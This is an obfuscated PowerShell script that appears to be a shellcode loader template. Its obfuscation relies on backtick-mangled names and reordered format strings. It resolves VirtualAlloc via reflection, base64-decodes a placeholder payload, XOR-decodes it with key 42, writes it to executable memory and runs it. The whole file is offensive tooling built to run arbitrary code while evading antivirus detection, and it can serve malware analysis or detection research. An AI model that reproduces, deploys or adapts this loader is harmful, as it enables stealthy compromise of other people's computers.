Set-S`TRic`T`MoDe -Version 2

function F`U`N`C_geT`_prOC_a`DdrESs {
	Param (${Var_MO`D`UlE}, ${Var_prO`cE`dU`Re})		
	${v`Ar`_unSafe_nAT`IvE`_mEThO`Ds} = ([AppDomain]::"CurrE`NTdoM`A`IN".("{2}{4}{1}{3}{0}" -f 's','sembli','GetA','e','s').Invoke() | whe`Re-ObJe`cT { ${_}."glOBAL`AsSEm`B`ly`cAc`HE" -And ${_}."Lo`cAti`on".("{0}{1}"-f'Sp','lit').Invoke('\\')[-1].("{0}{1}" -f 'E','quals').Invoke(("{0}{1}{2}"-f'Sy','stem.','dll')) }).("{0}{1}" -f 'GetT','ype').Invoke(("{0}{1}{8}{4}{5}{2}{7}{3}{6}" -f'Microsoft','.Wi','iv','ho','afe','Nat','ds','eMet','n32.Uns'))
	${va`R_gpA} = ${VaR_`UNS`AfE_nAtive`_MethO`ds}.("{2}{0}{1}" -f'Me','thod','Get').Invoke(("{0}{1}{2}{3}{4}"-f'Get','Pr','ocAddr','es','s'), [Type[]] @(("{2}{4}{3}{8}{5}{6}{7}{9}{0}{1}" -f'Re','f','S','stem.','y','time.In','ter','opServices.Handl','Run','e'), ("{1}{0}"-f'ring','st')))
	return ${v`AR_`gpa}."i`NVOke"(${nU`LL}, @([System.Runtime.InteropServices.HandleRef](ne`W-OB`ject ('System.Runt'+'i'+'me.In'+'ter'+'op'+'Services'+'.HandleRef')((NEW-o`B`Je`CT ('In'+'tPt'+'r')), (${vAr_`UnSAfE_NA`Tiv`e_`M`Et`hODS}.("{2}{0}{1}" -f'tMe','thod','Ge').Invoke(("{1}{3}{2}{0}"-f 'Handle','G','dule','etMo')))."i`NVoKe"(${nU`LL}, @(${vaR`_`MODuLe})))), ${V`A`R_`ProcEDuRE}))
}

function f`UNc`_gET_DE`lEG`AT`e_TyPE {
	Param (
		[Parameter(PositIoN = 0, MandaTORY = ${TR`Ue})] [Type[]] ${vaR_`PA`RA`meters},
		[Parameter(poSITion = 1)] [Type] ${vAr_r`E`TUR`N`_TY`PE} = [Void]
	)

	${vAr_Typ`E`_bUi`LDer} = [AppDomain]::"Cu`RRe`NtDoMAIn".("{2}{0}{4}{1}{3}" -f 'fineDynamicA','m','De','bly','sse').Invoke((n`Ew-O`Bject ('Sy'+'st'+'em.Refle'+'ctio'+'n'+'.'+'Assembl'+'yN'+'ame')(("{0}{2}{3}{1}" -f'Reflected','ate','Dele','g'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"R`Un").("{0}{3}{2}{1}"-f'D','odule','icM','efineDynam').Invoke(("{1}{0}{2}" -f'yM','InMemor','odule'), ${Fa`lSE}).("{0}{2}{1}"-f'Defi','ype','neT').Invoke(("{0}{2}{1}"-f'MyDe','e','legateTyp'), ("{8}{5}{3}{9}{0}{7}{1}{2}{6}{4}"-f' Se','Class, Au','to','Public','s',', ','Clas','aled, Ansi','Class',','), [System.MulticastDelegate])
	${VaR_Type_`B`UIl`DeR}.("{1}{2}{3}{0}"-f 'eConstructor','De','f','in').Invoke(("{8}{3}{5}{0}{7}{1}{2}{6}{4}" -f'eBy','ig, ','Pub','lName, ','c','Hid','li','S','RTSpecia'), [System.Reflection.CallingConventions]::"S`TA`NdArD", ${V`Ar_p`ArA`MEtERS}).("{5}{2}{4}{1}{0}{3}" -f'ntati','e','et','onFlags','Implem','S').Invoke(("{1}{0}{2}" -f 'i','Runt','me, Managed'))
	${Va`R_tYPE`_bu`il`d`ER}.("{2}{3}{0}{1}" -f 'neMetho','d','Def','i').Invoke('Invoke', ("{2}{4}{1}{5}{3}{0}{6}{7}" -f 't, Vi','g, ','Public, Hi','Slo','deBySi','New','rt','ual'), ${Va`R_ReTUR`N`_`T`yPE}, ${vA`R_`PA`RAMEteRs}).("{0}{5}{4}{1}{3}{2}"-f'SetImp','ation','s','Flag','ement','l').Invoke(("{1}{2}{3}{0}"-f 'anaged','R','unt','ime, M'))

	return ${V`Ar_tY`pe_BuI`ld`eR}.("{0}{2}{1}" -f'Crea','e','teTyp').Invoke()
}

If ([IntPtr]::"SI`ze" -eq 8) {
	[Byte[]]${vAr_`c`ode} = [System.Convert]::("{2}{3}{1}{0}"-f 'ring','t','FromBas','e64S').Invoke(('%%DATA%%'))

	for (${x} = 0; ${X} -lt ${vaR_`cO`DE}."c`oUNt"; ${x}++) {
		${vA`R_`C`ode}[${X}] = ${VA`R_CoDE}[${X}] -bxor 42
	}

	${va`R_`Va} = [System.Runtime.InteropServices.Marshal]::("{0}{2}{1}{7}{3}{6}{5}{4}" -f 'Ge','ateForFuncti','tDeleg','i','r','e','nt','onPo').Invoke((FUNC_g`e`T_`pr`OC_A`dD`RESs ('kerne'+'l3'+'2.dl'+'l') ('Vi'+'r'+'tu'+'alAlloc')), (f`U`N`C_`gEt_d`eLeGaTe`_TyPe @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	${var_`B`UFf`ER} = ${VAr`_`Va}."inV`o`Ke"([IntPtr]::"Z`ErO", ${V`Ar_CO`dE}."LEn`gtH", 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::("{1}{0}" -f'opy','C').Invoke(${V`AR_C`Ode}, 0, ${va`R`_B`UFFER}, ${vAR`_Co`De}."Le`N`Gth")

	${va`R_RUN`mE} = [System.Runtime.InteropServices.Marshal]::"G`eTdE`l`e`gAT`eFOrfunC`TiOnPoI`N`TEr"(${vAR_b`U`F`FEr}, (fUnC_g`E`T_`deLEgAt`E_TYpe @([IntPtr]) ([Void])))
	${v`Ar_`RuNMe}."in`V`oke"([IntPtr]::"ze`Ro")
}

